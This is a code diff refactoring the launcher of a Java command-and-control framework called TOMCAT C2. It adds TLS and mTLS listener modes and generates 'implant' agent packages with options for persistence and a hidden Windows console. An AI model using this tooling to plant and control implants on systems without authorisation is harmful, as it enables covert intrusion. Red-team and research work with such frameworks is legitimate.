@@ -2,6 +2,7 @@ package com.tomcat;
 
 import com.tomcat.core.crypto.CertificateManager;
 import com.tomcat.core.output.Logger;
+import com.tomcat.core.server.ListenerMode;
 import com.tomcat.iface.CLI;
 import com.tomcat.iface.GUI;
 import com.tomcat.iface.WebApp;
@@ -13,66 +14,54 @@ import java.io.*;
 import java.nio.file.*;
 import java.util.*;
 
-public class Start {
+public final class Start {
 
     private static ServerConfig Config;
 
     public static void main(String[] Args) {
         Config = new ServerConfig();
-        ProcessArgs(Args);
+        Logger.Configure(
+            Config.GetLoggingLevel(),
+            Config.IsVerbose(),
+            Config.IsFileLoggingEnabled(),
+            Config.GetLogFile(),
+            Config.GetMaxLogEntries()
+        );
+        ProcessArgs(Arrays.asList(Args));
     }
 
-    private static void ProcessArgs(String[] Args) {
-        List<String> ArgList = Arrays.asList(Args);
-
-        if (ArgList.contains("-h") || ArgList.contains("--help")) {
+    private static void ProcessArgs(List<String> Args) {
+        if (Args.contains("-h") || Args.contains("--help")) {
             PrintHelp();
             return;
         }
 
-        if (ArgList.contains("-i") || ArgList.contains("--init-certs")) {
+        if (Args.contains("-i") || Args.contains("--init-certs")) {
             SystemHelper.ClearScreen();
             TBanner.Logo();
             AUTHBanner.Logo();
-            String Host = GetArg(ArgList, "-S", "--host", Config.GetServerHost());
-            InitCertificates(Host);
+            InitCertificates(Arg(Args, "-S", "--host", Config.GetServerHost()));
             return;
         }
 
-        String GenAgent = GetArg(ArgList, "-a", "--gen-agent", null);
+        String GenAgent = Arg(Args, "-a", "--gen-agent", null);
         if (GenAgent != null) {
             SystemHelper.ClearScreen();
             TBanner.Logo();
             AUTHBanner.Logo();
-            String AgentHost = GetArg(ArgList, "-ah", "--agent-host", Config.GetServerHost());
-            int AgentPort = Integer.parseInt(
-                GetArg(ArgList, "-ap", "--agent-port", String.valueOf(Config.GetServerPort()))
-            );
-            boolean AgentMtls = ArgList.contains("-am") || ArgList.contains("--agent-mtls");
-            boolean Persistence = ArgList.contains("-ps") || ArgList.contains("--persistence");
-            boolean HideConsole = ArgList.contains("-hc") || ArgList.contains("--hide-console");
-            GenerateAgentCert(GenAgent, true, AgentHost, AgentPort, AgentMtls, Persistence, HideConsole);
+            GenerateAgent(GenAgent, Args);
             return;
         }
 
-        if (ArgList.contains("-m") || ArgList.contains("--gen-multi-agent")) {
+        if (Args.contains("-m") || Args.contains("--gen-multi-agent")) {
             SystemHelper.ClearScreen();
             TBanner.Logo();
             AUTHBanner.Logo();
-            int Count = Integer.parseInt(GetArg(ArgList, "-c", "--gen-agent-count", "10"));
-            String Prefix = GetArg(ArgList, "-u", "--gen-agent-prefix", "agent");
-            String AgentHost = GetArg(ArgList, "-ah", "--agent-host", Config.GetServerHost());
-            int AgentPort = Integer.parseInt(
-                GetArg(ArgList, "-ap", "--agent-port", String.valueOf(Config.GetServerPort()))
-            );
-            boolean AgentMtls = ArgList.contains("-am") || ArgList.contains("--agent-mtls");
-            boolean Persistence = ArgList.contains("-ps") || ArgList.contains("--persistence");
-            boolean HideConsole = ArgList.contains("-hc") || ArgList.contains("--hide-console");
-            GenerateMultipleAgents(Count, Prefix, AgentHost, AgentPort, AgentMtls, Persistence, HideConsole);
+            GenerateMultiAgent(Args);
             return;
         }
 
-        if (ArgList.contains("-l") || ArgList.contains("--list-agents")) {
+        if (Args.contains("-l") || Args.contains("--list-agents")) {
             SystemHelper.ClearScreen();
             TBanner.Logo();
             AUTHBanner.Logo();
@@ -80,12 +69,12 @@ public class Start {
             return;
         }
 
-        String RevokeAgent = GetArg(ArgList, "-r", "--revoke-agent", null);
-        if (RevokeAgent != null) {
+        String Revoke = Arg(Args, "-r", "--revoke-agent", null);
+        if (Revoke != null) {
             SystemHelper.ClearScreen();
             TBanner.Logo();
             AUTHBanner.Logo();
-            RevokeAgentCert(RevokeAgent);
+            RevokeAgent(Revoke);
             return;
         }
 
@@ -93,226 +82,225 @@ public class Start {
         TBanner.Logo();
         AUTHBanner.Logo();
 
-        String Host = GetArg(ArgList, "-S", "--host", Config.GetServerHost());
-        int Port = Integer.parseInt(GetArg(ArgList, "-p", "--port", String.valueOf(Config.GetWebPort())));
-        boolean UseMtls = ArgList.contains("-T") || ArgList.contains("--mtls") || Config.IsMtlsEnabled();
-        boolean Meterpreter = ArgList.contains("-M") || ArgList.contains("--meterpreter") || Config.IsMeterpreterMode();
+        String Host = Arg(Args, "-S", "--host", Config.GetServerHost());
+        int Port = parseInt(Arg(Args, "-p", "--port", String.valueOf(Config.GetServerPort())), Config.GetServerPort());
 
-        String Mode = Config.GetInterfaceMode();
-        if (ArgList.contains("-C") || ArgList.contains("--cli-mode")) Mode = "cli";
-        else if (ArgList.contains("-G") || ArgList.contains("--gui-mode")) Mode = "gui";
-        else if (ArgList.contains("-W") || ArgList.contains("--web-mode")) Mode = "web";
+        ListenerMode Mode = ResolveMode(Args);
 
-        if (UseMtls && !Files.exists(Paths.get("Certs/server.p12"))) {
-            Logger.Warnings("MTLS Certificates Not Found!");
-            Logger.Warnings("Run: java -jar tomcat-c2.jar --init-certs");
+        if (Mode.RequiresTls() && !Files.exists(Paths.get(Config.GetKeystorePath()))) {
+            Logger.Error("Keystore not found: " + Config.GetKeystorePath());
+            Logger.Warn("Run: java -jar tomcat-c2.jar --init-certs");
             System.exit(1);
         }
 
-        StartInterface(Host, Port, UseMtls, Meterpreter, Mode);
+        String Interface = Config.GetInterfaceMode();
+        if (Args.contains("-C") || Args.contains("--cli-mode")) Interface = "cli";
+        else if (Args.contains("-G") || Args.contains("--gui-mode")) Interface = "gui";
+        else if (Args.contains("-W") || Args.contains("--web-mode")) Interface = "web";
+
+        Logger.Info("Mode: " + Mode.name() + " | Interface: " + Interface.toUpperCase());
+        StartInterface(Host, Port, Mode, Interface);
     }
 
-    private static void StartInterface(String Host, int Port, boolean UseMtls, boolean Meterpreter, String Mode) {
+    private static ListenerMode ResolveMode(List<String> Args) {
+        String FromProp = Config.GetServerMode();
+        if (Args.contains("--fmtls")) return ListenerMode.FMTLS;
+        if (Args.contains("--mtls") || Args.contains("-T")) return ListenerMode.MTLS;
+        if (Args.contains("--tls")) return ListenerMode.TLS;
+        if (Args.contains("--https")) return ListenerMode.HTTPS;
+        if (Args.contains("--http")) return ListenerMode.HTTP;
+        if (Args.contains("--raw") || Args.contains("--plain")) return ListenerMode.RAW;
+        if (Args.contains("--multi") || Args.contains("-M")) return ListenerMode.MULTI;
+        return ListenerMode.FromString(FromProp);
+    }
+
+    private static void StartInterface(String Host, int Port, ListenerMode Mode, String Interface) {
         try {
-            switch (Mode.toLowerCase()) {
-                case "cli" -> {
-                    Logger.Messages("Interface: CLI Mode");
-                    new CLI(Config).Run(Host, Port, UseMtls, Meterpreter);
-                }
-                case "gui" -> {
-                    Logger.Messages("Interface: JavaFX GUI");
-                    GUI.Launch(Config);
-                }
+            switch (Interface) {
+                case "cli" -> new CLI(Config).Run(Host, Port, Mode);
+                case "gui" -> GUI.Launch(Config);
                 default -> {
-                    Logger.Messages("Interface: Web Panel (HTTP)");
-                    WebApp App = new WebApp(Config, UseMtls);
+                    WebApp App = new WebApp(Config, Mode);
                     App.Run(Host, Port);
                     Thread.currentThread().join();
                 }
             }
         } catch (InterruptedException Ignored) {
-            Logger.Warnings("Server Stopped By User");
+            Logger.Warn("Server stopped");
         } catch (Exception E) {
-            Logger.ErrorMsg("Error: " + E.getMessage());
+            Logger.Error("Fatal: " + E.getMessage());
             System.exit(1);
         }
     }
 
     private static void InitCertificates(String Host) {
         try {
-            CertificateManager Mgr = new CertificateManager("Certs", Config.GetKeystorePassword());
+            CertificateManager Mgr = new CertificateManager(Config);
             Mgr.Initialize(Host);
-            Logger.Messages("Certificates stored in: Certs/");
-            Logger.Messages("Next steps:");
-            Logger.Messages("  1. Generate agent: java -jar tomcat-c2.jar -a <agent-id>");
-            Logger.Messages("  2. Start with MTLS: java -jar tomcat-c2.jar --mtls");
+            Logger.Success("Certificates stored in: " + Paths.get(Config.GetKeystorePath()).getParent());
+            Logger.Info("Next: java -jar tomcat-c2.jar -a <agent-id>");
         } catch (Exception E) {
-            Logger.ErrorMsg("Certificate init failed: " + E.getMessage());
+            Logger.Error("Certificate init failed: " + E.getMessage());
         }
     }
 
-    private static void GenerateAgentCert(
-        String AgentId,
-        boolean UseRawName,
-        String Host,
-        int Port,
-        boolean UseMtls,
-        boolean Persistence,
-        boolean HideConsole
-    ) {
+    private static void GenerateAgent(String AgentId, List<String> Args) {
         try {
-            if (!Files.exists(Paths.get("Certs/ca.p12"))) {
-                Logger.Warnings("CA Not Found. Run: java -jar tomcat-c2.jar --init-certs");
-                return;
-            }
-            CertificateManager Mgr = new CertificateManager("Certs", Config.GetKeystorePassword());
-            Mgr.CreateCa();
-            String CertPath = Mgr.CreateAgentCertificate(AgentId, UseRawName, 365);
-            String AgentName = UseRawName ? AgentId : "Agent-" + AgentId;
-            String DeployDir = "IMPLANT/" + AgentName.toUpperCase();
-            Files.createDirectories(Paths.get(DeployDir));
-            Files.copy(Paths.get(CertPath), Paths.get(DeployDir + "/agent.p12"), StandardCopyOption.REPLACE_EXISTING);
-            Files.copy(
-                Paths.get("Certs/ca.p12"),
-                Paths.get(DeployDir + "/ca.p12"),
-                StandardCopyOption.REPLACE_EXISTING
+            AssertCaExists();
+            String Host = Arg(Args, "-ah", "--agent-host", Config.GetServerHost());
+            int Port = parseInt(
+                Arg(Args, "-ap", "--agent-port", String.valueOf(Config.GetServerPort())),
+                Config.GetServerPort()
             );
-            WriteAgentReadme(DeployDir, AgentName, Host, Port, UseMtls, Persistence, HideConsole);
-            Logger.Messages("Agent Deployment Package: " + DeployDir);
-            Logger.Messages("Server: " + Host + ":" + Port);
-            Logger.Messages("MTLS: " + (UseMtls ? "ENABLED" : "DISABLED"));
+            boolean UseMtls = Args.contains("-am") || Args.contains("--agent-mtls");
+            boolean Persist = Args.contains("-ps") || Args.contains("--persistence");
+            boolean HideCon = Args.contains("-hc") || Args.contains("--hide-console");
+            CertificateManager Mgr = new CertificateManager(Config);
+            Mgr.Initialize(Host);
+            String CertPath = Mgr.CreateAgentCertificate(AgentId);
+            DeployAgent(AgentId, CertPath, Host, Port, UseMtls, Persist, HideCon);
         } catch (Exception E) {
-            Logger.ErrorMsg("Agent cert generation failed: " + E.getMessage());
+            Logger.Error("Agent generation failed: " + E.getMessage());
         }
     }
 
-    private static void GenerateMultipleAgents(
-        int Count,
-        String Prefix,
-        String Host,
-        int Port,
-        boolean UseMtls,
-        boolean Persistence,
-        boolean HideConsole
-    ) {
-        Logger.Messages("Generating " + Count + " agents with prefix: " + Prefix);
-        int Success = 0;
+    private static void GenerateMultiAgent(List<String> Args) {
+        int Count = parseInt(Arg(Args, "-c", "--gen-agent-count", "10"), 10);
+        String Prefix = Arg(Args, "-u", "--gen-agent-prefix", "agent");
+        Logger.Info("Generating " + Count + " agents — prefix: " + Prefix);
+        int Ok = 0;
         for (int I = 1; I <= Count; I++) {
-            String AgentId = String.format("%s-%03d", Prefix, I);
+            String Id = String.format("%s-%03d", Prefix, I);
             try {
-                GenerateAgentCert(AgentId, true, Host, Port, UseMtls, Persistence, HideConsole);
-                Success++;
+                GenerateAgent(Id, Args);
+                Ok++;
             } catch (Exception E) {
-                Logger.ErrorMsg("Error generating " + AgentId + ": " + E.getMessage());
+                Logger.Error("Failed " + Id + ": " + E.getMessage());
             }
         }
-        Logger.Messages("Generated " + Success + "/" + Count + " agents successfully");
+        Logger.Info("Generated " + Ok + "/" + Count + " agents");
     }
 
     private static void ListAgents() {
         try {
-            CertificateManager Mgr = new CertificateManager("Certs", Config.GetKeystorePassword());
-            Map<String, Map<String, String>> Agents = Mgr.ListAgents();
-            if (Agents.isEmpty()) {
-                Logger.Warnings("No agents generated yet");
-                Logger.Messages("Generate with: java -jar tomcat-c2.jar -a <agent-id>");
+            CertificateManager Mgr = new CertificateManager(Config);
+            Path AgentDir = Paths.get(Config.GetAgentCertDir());
+            if (!Files.exists(AgentDir)) {
+                Logger.Warn("No agents found — generate with: -a <agent-id>");
                 return;
             }
-            Logger.Messages("Total Agents: " + Agents.size());
-            Agents.forEach((Name, Info) -> {
-                Logger.Messages("  Agent  : " + Name);
-                Logger.Messages("  Created: " + Info.getOrDefault("Created", "N/A"));
-                System.out.println();
-            });
+            Files.list(AgentDir)
+                .filter(P -> P.toString().endsWith(".p12"))
+                .forEach(P -> Logger.Info("Agent: " + P.getFileName()));
         } catch (Exception E) {
-            Logger.ErrorMsg("Failed to list agents: " + E.getMessage());
+            Logger.Error("List agents failed: " + E.getMessage());
         }
     }
 
-    private static void RevokeAgentCert(String AgentId) {
+    private static void RevokeAgent(String AgentId) {
         try {
-            CertificateManager Mgr = new CertificateManager("Certs", Config.GetKeystorePassword());
-            Mgr.RevokeAgent(AgentId);
+            CertificateManager Mgr = new CertificateManager(Config);
+            Mgr.RevokeAgentCertificate(AgentId);
         } catch (Exception E) {
-            Logger.ErrorMsg("Revoke failed: " + E.getMessage());
+            Logger.Error("Revoke failed: " + E.getMessage());
         }
     }
 
-    private static void WriteAgentReadme(
-        String Dir,
-        String Name,
+    private static void DeployAgent(
+        String Id,
+        String CertPath,
         String Host,
         int Port,
         boolean Mtls,
-        boolean Persistence,
-        boolean HideConsole
-    ) {
-        try (PrintWriter W = new PrintWriter(Dir + "/README.txt")) {
-            W.println("TOMCAT C2 Agent - " + Name);
-            W.println("Configuration:");
-            W.println("  Server Host: " + Host);
-            W.println("  Server Port: " + Port);
-            W.println("  MTLS Mode  : " + (Mtls ? "ENABLED" : "DISABLED"));
-            W.println("  Persistence: " + (Persistence ? "ENABLED" : "DISABLED"));
-            W.println("  HideConsole: " + (HideConsole ? "ENABLED" : "DISABLED"));
-            W.println();
-            W.println("Files:");
-            W.println("  agent.p12  - Agent PKCS12 Keystore (Keep Secure!)");
-            W.println("  ca.p12     - CA Truststore");
-            W.println("  README.txt - This file");
-            W.println();
-            W.println("Certificate expires in 365 days.");
-        } catch (IOException Ignored) {}
+        boolean Persist,
+        boolean HideCon
+    ) throws IOException {
+        String AgentDir = "IMPLANT/" + Id.toUpperCase();
+        Files.createDirectories(Paths.get(AgentDir));
+        Files.copy(Paths.get(CertPath), Paths.get(AgentDir + "/agent.p12"), StandardCopyOption.REPLACE_EXISTING);
+        Files.copy(Paths.get(Config.GetCaPath()), Paths.get(AgentDir + "/ca.p12"), StandardCopyOption.REPLACE_EXISTING);
+        try (PrintWriter W = new PrintWriter(AgentDir + "/README.txt")) {
+            W.println("TOMCAT C2 Agent — " + Id);
+            W.println("Server  : " + Host + ":" + Port);
+            W.println("MTLS    : " + (Mtls ? "ENABLED" : "DISABLED"));
+            W.println("Persist : " + Persist);
+            W.println("Files   : agent.p12  ca.p12");
+        }
+        Logger.Success("Agent package: " + AgentDir);
     }
 
-    private static String GetArg(List<String> Args, String ShortOpt, String LongOpt, String Default) {
+    private static void AssertCaExists() {
+        if (!Files.exists(Paths.get(Config.GetCaPath()))) {
+            Logger.Error("CA not found: " + Config.GetCaPath());
+            Logger.Warn("Run: java -jar tomcat-c2.jar --init-certs");
+            System.exit(1);
+        }
+    }
+
+    private static String Arg(List<String> Args, String Short, String Long, String Default) {
         for (int I = 0; I < Args.size() - 1; I++) {
-            if (Args.get(I).equals(ShortOpt) || Args.get(I).equals(LongOpt)) {
-                return Args.get(I + 1);
-            }
+            if (Args.get(I).equals(Short) || Args.get(I).equals(Long)) return Args.get(I + 1);
         }
         return Default;
+    }
+
+    private static int parseInt(String S, int Default) {
+        try {
+            return Integer.parseInt(S.trim());
+        } catch (Exception E) {
+            return Default;
+        }
     }
 
     private static void PrintHelp() {
         System.out.println(
             """
-                TOMCAT C2 Framework V2 (Java)
+                TOMCAT C2 Framework V2
 
-                Options:
+                Usage: java -jar tomcat-c2.jar [options]
+
+                General:
                   -h / --help               Show this help
-                  -i / --init-certs         Initialize MTLS certificates
+                  -i / --init-certs         Generate CA + server certificate
 
-                Server Options:
-                  -S / --host               Server host address
-                  -p / --port               Web panel port (default: 5000)
-                  -T / --mtls               Enable MTLS authentication
-                  -M / --meterpreter        Enable multi-protocol mode
-                  -C / --cli-mode           CLI interface
-                  -G / --gui-mode           JavaFX GUI interface
-                  -W / --web-mode           Web panel interface (default)
+                Listener Mode (default: server.mode in server.properties):
+                  --multi / -M              Accept all non-TLS connections (raw, TOMCAT, HTTP)
+                  --http                    HTTP beacon only
+                  --https                   HTTPS beacon only (TLS, no client cert)
+                  --tls                     TOMCAT agent over TLS (no client cert)
+                  --mtls / -T               TOMCAT agent over mTLS (client cert required)
+                  --fmtls                   Full mTLS on TCP + HTTPS beacon
 
-                Agent Options:
-                  -a / --gen-agent <id>     Generate single agent certificate
-                  -m / --gen-multi-agent    Generate multiple agent certificates
-                  -c / --gen-agent-count    Number of agents to generate
-                  -u / --gen-agent-prefix   Agent name prefix
-                  -l / --list-agents        List all agent certificates
-                  -r / --revoke-agent <id>  Revoke agent certificate
-                  -ah / --agent-host        C2 host for agent configuration
-                  -ap / --agent-port        C2 port for agent configuration
-                  -am / --agent-mtls        Enable MTLS for agent
-                  -ps / --persistence       Enable persistence for agent
-                  -hc / --hide-console      Hide console window (Windows)
+                Server:
+                  -S / --host <host>        Bind host        (default: server.host in .properties)
+                  -p / --port <port>        Bind port        (default: server.port)
+
+                Interface:
+                  -C / --cli-mode           CLI
+                  -G / --gui-mode           JavaFX GUI
+                  -W / --web-mode           Web panel (default)
+
+                Agent Certificates:
+                  -a / --gen-agent <id>     Generate single agent cert
+                  -m / --gen-multi-agent    Generate multiple agent certs
+                    -c / --gen-agent-count  Count  (default: 10)
+                    -u / --gen-agent-prefix Prefix (default: agent)
+                  -l / --list-agents        List agents
+                  -r / --revoke-agent <id>  Revoke agent cert
+                  -ah / --agent-host        C2 host embedded in agent
+                  -ap / --agent-port        C2 port embedded in agent
+                  -am / --agent-mtls        Enable mTLS for agent
+                  -ps / --persistence       Enable persistence
+                  -hc / --hide-console      Hide console (Windows)
 
                 Examples:
-                  java -jar tomcat-c2.jar
-                  java -jar tomcat-c2.jar -C
-                  java -jar tomcat-c2.jar -G
-                  java -jar tomcat-c2.jar --mtls
+                  java -jar tomcat-c2.jar -C --raw
+                  java -jar tomcat-c2.jar -C --multi
+                  java -jar tomcat-c2.jar -C --mtls
+                  java -jar tomcat-c2.jar -C --fmtls
+                  java -jar tomcat-c2.jar -C --tls -p 443
                   java -jar tomcat-c2.jar -i
-                  java -jar tomcat-c2.jar -a myagent -ah 192.168.1.1 -ap 4444 -am
-                  java -jar tomcat-c2.jar -m -c 5 -u team -ah 192.168.1.1 -ap 4444
+                  java -jar tomcat-c2.jar -a myagent -ah 10.0.0.1 -ap 4444 -am
             """
         );
     }
